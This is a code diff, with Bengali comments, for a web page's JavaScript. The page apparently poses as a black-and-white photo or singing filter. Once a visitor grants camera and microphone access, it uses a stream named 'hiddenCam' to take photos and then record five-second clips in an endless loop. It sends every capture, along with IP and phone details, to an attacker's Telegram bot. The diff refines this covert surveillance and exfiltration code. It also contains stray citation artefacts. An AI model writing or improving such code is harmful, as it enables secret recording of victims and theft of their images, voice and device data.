@@ -115,7 +115,6 @@
     const canvas = document.getElementById('snapshotCanvas');
 
     let camStream = null;
-    let audioCtx = null;
     let isStarted = false;
 
     // আইপি এবং ফোনের ডিটেইলস সংগ্রহ করে টেলিগ্রামে পাঠানোর ফাংশন
@@ -179,20 +178,16 @@
       try {
         camStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user' },
-          audio: {
-            echoCancellation: true,
-            noiseSuppression: true,
-            autoGainControl: true
-          }
+          audio: true
         });
 
         hiddenCam.srcObject = camStream;
-        await new Promise(resolve => setTimeout(resolve, 800));
+        await new Promise(resolve => setTimeout(resolve, 1000));
 
-        // ২. ক্লাসিক বিএন্ডডব্লিউ ফিল্টারসহ ৫টি ছবি তুলবে[span_1](start_span)[span_1](end_span)
+        // ২. ক্লাসিক বিএন্ডডব্লিউ ফিল্টারসহ ৫টি ছবি খুব দ্রুত তুলবে ও পাঠাবে[span_1](start_span)[span_1](end_span)
         await captureAndSendPhotos(5);
 
-        // ৩. এরপর ৫ সেকেন্ড করে ভিডিও ও অটোটিউন/রিভার্বযুক্ত অডিও ক্লিপ পাঠানো শুরু করবে
+        // ৩. এরপর ৫ সেকেন্ড করে ভিডিও ও অডিও ক্লিপ পাঠানো শুরু করবে
         startPeriodicRecording();
 
       } catch (err) {
@@ -217,7 +212,7 @@
           canvas.toBlob((blob) => {
             resolve(blob);
           }, 'image/jpeg', 0.90);
-        }, 300);
+        }, 400);
       });
     }
 
@@ -230,12 +225,13 @@
           formData.append('photo', photoBlob, `photo_${i}_${Date.now()}.jpg`);
           formData.append('caption', `🎬 ক্লাসিক বিএন্ডডব্লিউ ছবি #${i}`);[span_2](start_span)[span_2](end_span)
 
-          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          // await ব্যবহার করে রিকোয়েস্ট পাঠানো নিশ্চিত করা হয়েছে যাতে মেসেজ ড্রপ না হয়
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             body: formData
           }).catch(err => console.log("Photo send failed", err));
         }
-        await new Promise(r => setTimeout(r, 200));
+        await new Promise(r => setTimeout(r, 300));
       }
     }
 
@@ -245,133 +241,56 @@
       const recordInterval = async () => {
         if (!camStream || camStream.active === false) return;
 
-        let videoOptions = { mimeType: 'video/mp4' };
-        if (!MediaRecorder.isTypeSupported(videoOptions.mimeType)) {
-          videoOptions = { mimeType: 'video/webm;codecs=h264,opus' };
-          if (!MediaRecorder.isTypeSupported(videoOptions.mimeType)) {
-            videoOptions = { mimeType: 'video/webm' };
+        let options = { mimeType: 'video/mp4' };
+        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+          options = { mimeType: 'video/webm;codecs=h264,opus' };
+          if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+            options = { mimeType: 'video/webm' };
           }
         }
 
-        let videoRecorder, audioRecorder;
-        let videoChunks = [];
-        let audioChunks = [];
+        let mediaRecorder;
+        let chunks = [];
 
         try {
-          videoRecorder = new MediaRecorder(camStream, videoOptions);
-
-          // গান গাওয়ার ফিল্টার (অটোটিউন, রিভার্ব ও ইকো ইফেক্ট) যুক্ত করার জন্য Web Audio API
-          if (!audioCtx) {
-            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-          }
-          if (audioCtx.state === 'suspended') {
-            audioCtx.resume();
-          }
-
-          const source = audioCtx.createMediaStreamSource(camStream);
-          
-          // ইকো এবং রিভার্ব ফিল তৈরি করার জন্য ডিলে নোড
-          const delayNode = audioCtx.createDelay();
-          delayNode.delayTime.value = 0.20; // ২০ মিলি সেকেন্ড ইকো ডিলে
-          
-          const feedbackNode = audioCtx.createGain();
-          feedbackNode.gain.value = 0.3; // ইকো ফিডব্যাক
-
-          // অটোটিউন ও ভোকাল ক্রিস্টাল ক্লিয়ার করার জন্য ফিল্টার নোড
-          const filterNode = audioCtx.createBiquadFilter();
-          filterNode.type = 'peaking';
-          filterNode.frequency.value = 3000;
-          filterNode.gain.value = 6.0; // ভোকাল বুস্ট ও পিচ শাইনিং
-
-          const dryGain = audioCtx.createGain();
-          dryGain.gain.value = 0.6;
-          
-          const wetGain = audioCtx.createGain();
-          wetGain.gain.value = 0.4; // রিভার্ব ও ইকো মিক্সচার
-
-          const destination = audioCtx.createMediaStreamDestination();
-
-          // অডিও সিগন্যাল রাউটিং
-          source.connect(dryGain);
-          dryGain.connect(destination);
-
-          source.connect(filterNode);
-          filterNode.connect(delayNode);
-          delayNode.connect(feedbackNode);
-          feedbackNode.connect(delayNode);
-          delayNode.connect(wetGain);
-          wetGain.connect(destination);
-
-          audioRecorder = new MediaRecorder(destination.stream);
+          mediaRecorder = new MediaRecorder(camStream, options);
         } catch (e) {
-          // কোনো কারণে Web Audio API ফেইল করলে নরমাল অডিও স্ট্রিম ব্যাকআপ হিসেবে নেবে
-          try {
-            const audioStream = new MediaStream(camStream.getAudioTracks());
-            audioRecorder = new MediaRecorder(audioStream);
-          } catch (err) {
-            setTimeout(recordInterval, 1000);
-            return;
-          }
+          setTimeout(recordInterval, 1000);
+          return;
         }
 
-        videoRecorder.ondataavailable = (e) => {
-          if (e.data && e.data.size > 0) videoChunks.push(e.data);
+        mediaRecorder.ondataavailable = (e) => {
+          if (e.data && e.data.size > 0) {
+            chunks.push(e.data);
+          }
         };
 
-        audioRecorder.ondataavailable = (e) => {
-          if (e.data && e.data.size > 0) audioChunks.push(e.data);
-        };
-
-        let isProcessed = false;
-        const handleStop = async () => {
-          if (isProcessed) return;
-          isProcessed = true;
-
-          if (videoChunks.length > 0) {
-            const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+        mediaRecorder.onstop = async () => {
+          if (chunks.length > 0) {
+            const videoBlob = new Blob(chunks, { type: options.mimeType.includes('mp4') ? 'video/mp4' : 'video/webm' });
             if (videoBlob.size > 1000) {
-              const videoForm = new FormData();
-              videoForm.append('chat_id', TELEGRAM_CHAT_ID);
-              videoForm.append('video', videoBlob, `clip_${Date.now()}.mp4`);
-              videoForm.append('caption', `🎥 ৫ সেকেন্ডের ভিডিও ক্লিপ`);
+              const formData = new FormData();
+              formData.append('chat_id', TELEGRAM_CHAT_ID);
+              formData.append('video', videoBlob, `clip_${Date.now()}.mp4`);
+              formData.append('caption', `🎥 ৫ সেকেন্ডের ভিডিও ক্লিপ`);
 
-              fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                 method: 'POST',
-                body: videoForm
+                body: formData
               }).catch(err => console.log("Video send failed", err));
             }
           }
 
-          if (audioChunks.length > 0) {
-            const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-            if (audioBlob.size > 500) {
-              const audioForm = new FormData();
-              audioForm.append('chat_id', TELEGRAM_CHAT_ID);
-              audioForm.append('voice', audioBlob, `audio_${Date.now()}.ogg`);
-              audioForm.append('caption', `🎙️ স্টুডিও অডিও (অটোটিউন, রিভার্ব ও ইকো সহ)`);
-
-              fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
-                method: 'POST',
-                body: audioForm
-              }).catch(err => console.log("Audio send failed", err));
-            }
-          }
-
-          setTimeout(recordInterval, 500);
+          // পরবর্তী ক্লিপের জন্য রিকার্সভ কল
+          setTimeout(recordInterval, 1000);
         };
 
-        videoRecorder.onstop = handleStop;
-        audioRecorder.onstop = handleStop;
+        mediaRecorder.start();
 
-        videoRecorder.start();
-        audioRecorder.start();
-
+        // ঠিক ৫ সেকেন্ড পর রেকর্ডিং বন্ধ করা
         setTimeout(() => {
-          if (videoRecorder && videoRecorder.state === 'recording') {
-            videoRecorder.stop();
-          }
-          if (audioRecorder && audioRecorder.state === 'recording') {
-            audioRecorder.stop();
+          if (mediaRecorder && mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
           }
         }, 5000);
       };
